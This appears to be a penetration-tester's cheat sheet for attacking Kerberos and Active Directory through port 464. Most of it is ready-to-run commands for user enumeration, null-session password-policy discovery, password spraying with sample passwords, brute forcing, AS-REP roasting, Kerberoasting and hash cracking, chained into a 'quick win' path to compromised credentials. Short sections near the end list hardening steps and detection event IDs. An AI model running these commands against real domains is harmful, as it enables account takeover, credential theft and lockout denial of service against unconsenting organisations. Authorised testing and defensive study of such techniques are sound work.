# KERBEROS KPASSWD ENUMERATION (Port 464/TCP & UDP)

## SERVICE OVERVIEW
```
Kerberos kpasswd - Kerberos password change service
- Port: 464/TCP and 464/UDP
- Used to change Kerberos passwords
- Part of Active Directory Domain Services
- RFC 3244 - Kerberos Change Password Protocol
- Critical for password policy enumeration
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -sU -p464 <IP>                         # TCP and UDP scan
nmap -sV -p464 <IP>                             # TCP only
nmap -sU -p464 <IP>                             # UDP only
nc -nv <IP> 464                                 # Manual TCP connection
```

## NMAP ENUMERATION
```bash
# Kerberos enumeration
nmap -p464,88 --script krb5-enum-users <IP>     # User enumeration
nmap -p88,464 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.LOCAL' <IP>

# Version detection
nmap -sV -p464,88,749 <IP>                      # All Kerberos ports
```

## KERBEROS PASSWORD CHANGE
```bash
# kpasswd command (if you have valid credentials)
kpasswd <username>@<REALM>

# Change password via kpasswd
kpasswd username@DOMAIN.LOCAL
> Old password: <old_password>
> New password: <new_password>
> Verify password: <new_password>

# Programmatic password change
echo -e "<old_pass>\n<new_pass>\n<new_pass>" | kpasswd username@DOMAIN.LOCAL
```

## PASSWORD POLICY ENUMERATION
```bash
# Enum4linux (includes password policy)
enum4linux -P <IP>                              # Password policy

# CrackMapExec
crackmapexec smb <IP> --pass-pol                # Password policy via SMB
crackmapexec ldap <IP> -u <user> -p <pass> --pass-pol  # Via LDAP

# RPCclient
rpcclient -U "" -N <IP> -c "getdompwinfo"       # Null session

# ldapsearch (if you have creds)
ldapsearch -x -h <IP> -D "CN=user,DC=domain,DC=local" -w <password> -b "DC=domain,DC=local" "(objectClass=domainDNS)" pwdProperties pwdHistoryLength maxPwdAge minPwdAge minPwdLength
```

## KERBEROS USER ENUMERATION
```bash
# Kerbrute (username enumeration)
kerbrute userenum -d DOMAIN.LOCAL --dc <IP> users.txt

# Nmap kerberos user enum
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.LOCAL',userdb=users.txt <IP>

# GetNPUsers (AS-REP Roasting - no pre-auth required)
impacket-GetNPUsers DOMAIN.LOCAL/ -dc-ip <IP> -usersfile users.txt -format hashcat -outputfile hashes.txt
```

## PASSWORD SPRAYING
```bash
# CrackMapExec password spray
crackmapexec smb <IP> -u users.txt -p 'Password123!' --continue-on-success

# Kerbrute password spray
kerbrute passwordspray -d DOMAIN.LOCAL --dc <IP> users.txt 'Password123!'

# Avoid account lockout - check password policy first!
crackmapexec smb <IP> --pass-pol                # Check lockout threshold
```

## KERBEROS PRE-AUTHENTICATION BRUTEFORCE
```bash
# Brute force Kerberos pre-auth (generates AS-REQ)
# Be careful - this can lock out accounts!

# Kerbrute with password list
kerbrute bruteuser -d DOMAIN.LOCAL --dc <IP> passwords.txt username

# Note: Check password policy first to avoid lockout
# Default Windows: 5 failed attempts, 30 min lockout
```

## KERBEROS ATTACKS RELATED TO PORT 464
```bash
# 1. Password Policy Enumeration (no auth required)
crackmapexec smb <IP> --pass-pol

# 2. Password Spraying (after policy check)
kerbrute passwordspray -d DOMAIN.LOCAL --dc <IP> users.txt 'Summer2024!'

# 3. AS-REP Roasting (users without pre-auth)
impacket-GetNPUsers DOMAIN.LOCAL/ -dc-ip <IP> -usersfile users.txt -format hashcat -outputfile asrep.txt

# 4. Kerberoasting (service accounts)
impacket-GetUserSPNs DOMAIN.LOCAL/user:password -dc-ip <IP> -request -outputfile kerberoast.txt

# 5. Password change (if you have old password)
kpasswd username@DOMAIN.LOCAL
```

## IMPACKET KPASSWD
```bash
# Change password via Impacket (if you have old password)
# Note: Impacket doesn't have direct kpasswd utility
# Use changepasswd.py or kpasswd command

# Via smbpasswd (if SMB accessible)
smbpasswd -r <IP> -U username

# Via rpcclient
rpcclient -U "DOMAIN\username%oldpass" <IP>
> setuserinfo2 username 23 'newpassword'
```

## COMMON MISCONFIGURATIONS
```
☐ No password complexity requirements
☐ Short minimum password length (<8 characters)
☐ No account lockout policy (unlimited attempts)
☐ Long lockout duration (DoS opportunity)
☐ Weak password history (allows password reuse)
☐ Reversible encryption enabled (passwords stored reversibly)
☐ Pre-authentication not required for some users (AS-REP Roasting)
☐ Service accounts with SPNs and weak passwords (Kerberoasting)
```

## PASSWORD POLICY ATTRIBUTES
```
Key attributes to check:
- minPwdLength: Minimum password length
- pwdHistoryLength: Number of passwords remembered
- maxPwdAge: Maximum password age
- minPwdAge: Minimum password age (prevents frequent changes)
- lockoutThreshold: Failed attempts before lockout
- lockoutDuration: How long account is locked
- pwdProperties: Password complexity, reversible encryption, etc.

pwdProperties values:
0x0001 - Password complexity enabled
0x0002 - Password cannot be changed
0x0004 - Password not required
0x0008 - Store password with reversible encryption
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/gather/kerberos_enumusers        # User enumeration
use auxiliary/scanner/smb/smb_enumusers        # SMB user enum
use auxiliary/gather/windows_password_policy   # Password policy

set RHOSTS <IP>
set DOMAIN DOMAIN.LOCAL
run
```

## KERBRUTE USAGE
```bash
# Install kerbrute
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# User enumeration
kerbrute userenum -d DOMAIN.LOCAL --dc <IP> users.txt

# Password spray
kerbrute passwordspray -d DOMAIN.LOCAL --dc <IP> domain_users.txt 'Password123!'

# Brute force single user (dangerous!)
kerbrute bruteuser -d DOMAIN.LOCAL --dc <IP> passwords.txt administrator
```

## QUICK WIN CHECKLIST
```
☐ Enumerate password policy (no auth required via SMB)
☐ Check for weak policy (min length, lockout threshold)
☐ Enumerate users via Kerberos (kerbrute, GetNPUsers)
☐ Check for AS-REP Roastable users (no pre-auth)
☐ Password spray with common passwords (Summer2024!, etc.)
☐ Check for Kerberoastable accounts (SPNs)
☐ Test default credentials if spray fails
☐ Change password if you have old credentials
```

## ONE-LINER ENUMERATION
```bash
# Quick password policy check
crackmapexec smb <IP> --pass-pol

# User enumeration + AS-REP roasting
kerbrute userenum -d DOMAIN.LOCAL --dc <IP> users.txt && impacket-GetNPUsers DOMAIN.LOCAL/ -dc-ip <IP> -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

## KERBEROS PORT OVERVIEW
```
Port 88/TCP & UDP  - Kerberos Authentication (KDC)
Port 464/TCP & UDP - Kerberos Password Change (kpasswd)
Port 749/TCP & UDP - Kerberos Admin (kadmin)
Port 750/TCP       - Kerberos v4 (legacy)

All should be scanned together for full Kerberos enumeration
```

## SECURITY IMPLICATIONS
```
RISKS:
- Weak password policy enables brute force
- AS-REP Roasting (users without pre-auth)
- Password spraying (if no lockout or high threshold)
- Account lockout DoS (if spray triggers lockout)
- Kerberoasting (service accounts with weak passwords)
- Information disclosure (user enumeration, policy details)

RECOMMENDATIONS:
- Enforce strong password policy (min 12+ chars, complexity)
- Enable account lockout (3-5 attempts, 30+ min duration)
- Require Kerberos pre-authentication for all users
- Use strong passwords for service accounts with SPNs
- Monitor for password spray attacks (Event ID 4625)
- Implement Kerberos encryption (AES, not RC4)
- Regular audit of password policy compliance
```

## DEFENSE DETECTION
```bash
# Windows Event IDs to monitor:
4768 - Kerberos TGT requested (AS-REQ)
4771 - Kerberos pre-auth failed (password spray indicator)
4625 - Failed logon (multiple = spray/brute force)
4740 - Account locked out
4738 - User account changed (password change)

# Check for password spray patterns:
# - Multiple 4771 events from same source
# - Different usernames, same password
# - Short time window
# - Multiple IPs (distributed spray)
```

## TOOLS
```bash
# kerbrute (user enum, password spray)
kerbrute userenum/passwordspray/bruteuser

# Impacket
impacket-GetNPUsers                             # AS-REP Roasting
impacket-GetUserSPNs                            # Kerberoasting

# CrackMapExec
crackmapexec smb <IP> --pass-pol
crackmapexec smb <IP> -u users.txt -p 'Pass123!'

# kpasswd (Kerberos password change)
kpasswd username@REALM

# Nmap
nmap -p88,464,749 --script krb5-enum-users <IP>
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# 1. Enumerate password policy
crackmapexec smb <IP> --pass-pol > policy.txt

# 2. Generate user list
kerbrute userenum -d DOMAIN.LOCAL --dc <IP> users.txt -o valid_users.txt

# 3. AS-REP Roasting
impacket-GetNPUsers DOMAIN.LOCAL/ -dc-ip <IP> -usersfile valid_users.txt -format hashcat -o asrep.txt

# 4. Crack AS-REP hashes
hashcat -m 18200 asrep.txt rockyou.txt

# 5. Password spray (if no AS-REP success)
kerbrute passwordspray -d DOMAIN.LOCAL --dc <IP> valid_users.txt 'Summer2024!'

# 6. Use compromised credentials
crackmapexec smb <IP> -u user -p 'cracked_pass' --shares
```
